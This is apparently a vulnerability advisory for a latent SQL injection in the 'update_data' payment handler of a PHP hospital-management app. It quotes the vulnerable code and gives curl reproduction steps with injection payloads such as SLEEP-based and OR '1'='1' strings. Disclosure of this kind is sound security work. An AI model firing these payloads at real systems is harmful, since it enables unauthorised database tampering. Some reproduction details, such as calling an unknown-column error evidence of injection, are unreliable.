### Title

SQL injection in the `update_data` payment handler (`func.php`, `func3.php`, `newfunc.php`)

### Summary

The `update_data` block in `func.php`, `func3.php`, and `newfunc.php` builds the SQL `UPDATE appointmenttb set payment='$status' where contact='$contact'` from `$_POST['contact']` and `$_POST['status']` without parameter binding. The same source files also host the login SQL injection (CVE-01). The current schema does not contain a `payment` column, so the `UPDATE` fails immediately and the injection is not directly exploitable, but the code pattern is identical to the other SQL injection vulnerabilities and will become exploitable if the schema is fixed.

### Affected Version

Commit: `bc3bb9cbadfb2b1afb36660b5119ff42a03a7a25`

### Vulnerability Type

SQL Injection (CWE-89), latent until the schema is corrected

### Affected Code

File: `func.php`

```php
if(isset($_POST['update_data'])){
    $contact=$_POST['contact'];
    $status=$_POST['status'];
    $query="update appointmenttb set payment='$status' where contact='$contact';";
    $result=mysqli_query($con,$query);
    if($result) header("Location:updated.php");
}
```

File: `func3.php`

```php
if(isset($_POST['update_data'])){
    $contact=$_POST['contact'];
    $status=$_POST['status'];
    $query="update appointmenttb set payment='$status' where contact='$contact';";
    $result=mysqli_query($con,$query);
    if($result) header("Location:updated.php");
}
```

File: `newfunc.php`

```php
if(isset($_POST['update_data'])){
    $contact=$_POST['contact'];
    $status=$_POST['status'];
    $query="update appointmenttb set payment='$status' where contact='$contact';";
    $result=mysqli_query($con,$query);
    if($result) header("Location:updated.php");
}
```

### Root Cause

`$_POST['contact']` and `$_POST['status']` are inserted into a single-quoted SQL literal without parameter binding. The query is executed with `mysqli_query()`, which does not perform any sanitisation. The bug is currently masked by the fact that the `payment` column does not exist in the `appointmenttb` schema.

### Steps to Reproduce

1. Deploy the application and set `BASE_URL`.

```bash
BASE_URL="http://hms.localhost"
```

2. Submit a syntactically valid SQL injection payload. The query fails because of the missing `payment` column, but the SQL injection is still observable in the MySQL error log:

```bash
curl -sS -i "$BASE_URL/func.php" \
  --data-urlencode "update_data=1" \
  --data-urlencode "contact=8838489464" \
  --data-urlencode "status=' OR SLEEP(3) -- -"
```

Observed response (302 redirect to `updated.php`):

```text
HTTP/1.1 302 Found
Location: updated.php
```

3. The MySQL server logs the parse error:

```text
[ERROR] Unknown column 'payment' in 'field list'
```

4. The injection primitive becomes exploitable once the `payment` column is added. For example, after running:

```sql
ALTER TABLE appointmenttb ADD COLUMN payment VARCHAR(20) DEFAULT 'Pay later';
```

the same payload as in CVE-04 will execute successfully:

```bash
curl -sS "$BASE_URL/func.php?ID=1'+OR+'1'%3d'1&cancel=update" | head -20
```

5. The same injection primitive in `func3.php` and `newfunc.php` is also reachable without authentication (CVE-09):

```bash
curl -sS "$BASE_URL/func3.php" \
  --data-urlencode "update_data=1" \
  --data-urlencode "contact=' OR '1'='1' -- -" \
  --data-urlencode "status=evil"
```

### Impact

The SQL injection is currently latent because the `payment` column does not exist. The bug is still significant because:

- The same code pattern is used in every other SQL statement in the application (CVE-01 to CVE-04, CVE-05, CVE-06, CVE-07), and the `update_data` block is a copy-paste of the same pattern.
- A schema change that adds the `payment` column (which is implied by the existence of the controller) would immediately activate the injection.
- The same `$_POST['contact']` and `$_POST['status']` parameters are persisted in the `appointmenttb` table via the `INSERT` in `admin-panel.php`, so the missing column is a one-line fix away from being exploitable.
- The injection is reachable without authentication (CVE-09), so there is no access barrier to exploitation once the schema is fixed.

### CVSS 3.1

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
Score: 9.1 (Critical)
```
